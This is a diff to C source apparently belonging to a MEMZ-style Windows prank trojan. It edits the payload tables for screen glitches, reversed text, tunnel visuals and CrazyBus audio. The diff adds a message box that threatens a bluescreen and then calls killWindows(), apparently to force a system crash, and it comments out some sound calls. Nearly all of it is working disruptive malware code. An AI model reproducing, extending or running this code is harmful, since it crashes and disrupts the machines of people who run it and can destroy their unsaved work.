@@ -23,7 +23,6 @@ PAYLOAD payloads[] = {
 	{ payloadHostVisual, (LPVOID)payloadDrawErrors, 10000, 0, 0, 0, 0 },
 	{ payloadHostDefault, (LPVOID)payloadReverseText, 40000, 0, 0, 0, 0 },
 	{ payloadHostVisual, (LPVOID)payloadTunnel, 60000, 0, 0, 0, 0 },
-	{ payloadHostVisual, (LPVOID)payloadGlitches, 15000, 0, 0, 0, 0 },
 	{ payloadHostCrazyBus, NULL, 1000, 0, 0, 0, 0 },
 #endif
 };
@@ -135,7 +134,9 @@ PAYLOADFUNCTIONDEFAULT(payloadMessageBox) {
 
 DWORD WINAPI messageBoxThread(LPVOID parameter) {
 	HHOOK hook = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
-	MessageBoxW(NULL, L"Still using this computer?", L"lol", MB_SYSTEMMODAL | MB_OK | MB_ICONWARNING);
+	MessageBoxW(NULL, L"Are you still using this computer?", L"LOL!", MB_SYSTEMMODAL | MB_OK | MB_ICONWARNING);
+	MessageBoxW(NULL, L"One More click will trigger a bluescreen!", L"BSOD!", MB_OK | MB_ICONERROR);
+	killWindows();
 	UnhookWindowsHookEx(hook);
 
 	return 0;
@@ -188,10 +189,10 @@ PAYLOADFUNCTIONDEFAULT(payloadSound) {
 	// But the sound is not not as fast as before. I hope there is another way to fix it without slowing down the payload.
 	// As this only happens for the enable-disable part, I will only include that in the clean build as a workaround.
 #ifdef CLEAN
-	PlaySoundA(sounds[random() % nSounds], GetModuleHandle(NULL), SND_SYNC);
+	//PlaySoundA(sounds[random() % nSounds], GetModuleHandle(NULL), SND_SYNC);
 	out: return random() % 10;
 #else
-	PlaySoundA(sounds[random() % nSounds], GetModuleHandle(NULL), SND_ASYNC);
+	//PlaySoundA(sounds[random() % nSounds], GetModuleHandle(NULL), SND_ASYNC);
 	out: return 20 + (random() % 20);
 #endif
 }
@@ -205,6 +206,7 @@ PAYLOADFUNCTIONVISUAL(payloadGlitches) {
 	int y2 = random() % (h - 400);
 	int width = random() % 400;
 	int height = random() % 400;
+
 
 	BitBlt(hdc, x1, y1, width, height, hdc, x2, y2, SRCCOPY);
 
@@ -255,13 +257,13 @@ PAYLOADHOST(payloadHostCrazyBus) {
 	WAVEFORMATEX fmt = { WAVE_FORMAT_PCM, 1, 44100, 44100, 1, 8, 0 };
 
 	HWAVEOUT hwo;
-	waveOutOpen(&hwo, WAVE_MAPPER, &fmt, NULL, NULL, CALLBACK_NULL);
+	//waveOutOpen(&hwo, WAVE_MAPPER, &fmt, NULL, NULL, CALLBACK_NULL);
 
 	const int bufsize = 44100 * 30; // 30 Seconds
 	char *wavedata = (char *)LocalAlloc(0, bufsize);
 
 	WAVEHDR hdr = { wavedata, bufsize, 0, 0, 0, 0, 0, 0 };
-	waveOutPrepareHeader(hwo, &hdr, sizeof(hdr));
+	//waveOutPrepareHeader(hwo, &hdr, sizeof(hdr));
 
 	for (;;) {
 #ifdef CLEAN
@@ -278,7 +280,7 @@ PAYLOADHOST(payloadHostCrazyBus) {
 #ifdef CLEAN
 			waveOutReset(hwo);
 #endif
-			waveOutWrite(hwo, &hdr, sizeof(hdr));
+			//waveOutWrite(hwo, &hdr, sizeof(hdr));
 
 			while (!(hdr.dwFlags & WHDR_DONE)
 #ifdef CLEAN
